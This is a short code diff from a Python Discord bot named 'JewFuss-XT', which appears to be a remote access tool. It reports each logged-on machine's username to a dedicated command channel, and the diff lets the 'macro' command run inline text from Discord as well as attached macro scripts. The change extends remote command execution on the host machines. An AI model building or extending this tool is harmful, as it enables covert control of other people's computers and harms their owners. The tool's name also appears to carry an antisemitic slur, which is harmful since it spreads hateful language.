@@ -318,7 +318,7 @@ async def i_macro(execstr, ctx, echo_errors=True):
             ctx.send(f"Exception: {e}")
 
 @bot.command(help="A modified version of PyMacro to work as a discord bot, docs at https://github.com/gabrielzv1233/PyMacro/blob/main/readme.md")
-async def macro(ctx):
+async def macro(ctx, *, command: str = None):
     if ctx.message.attachments:
         if len(ctx.message.attachments) > 1:
             await ctx.send("Please attach only one .pymacro file at a time.")
@@ -330,6 +330,10 @@ async def macro(ctx):
             script_content = file_bytes.decode("utf-8")
             await i_macro(script_content, ctx)
             return
+        
+    elif command != None:
+        await i_macro(command, ctx)
+        return
         
     await ctx.send("No .pymacro file attached!")
 
@@ -414,7 +418,7 @@ async def on_ready():
             await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands.")
         in_server_ammount += 1
             
-    print(f'JewFuss-XT logged in as {bot.user.name} on {in_server_ammount} server(s)')
+    print(f'JewFuss-XT logged in as "{bot.user.name}" on {in_server_ammount} server(s)')
 
 @bot.event
 async def on_message(message):
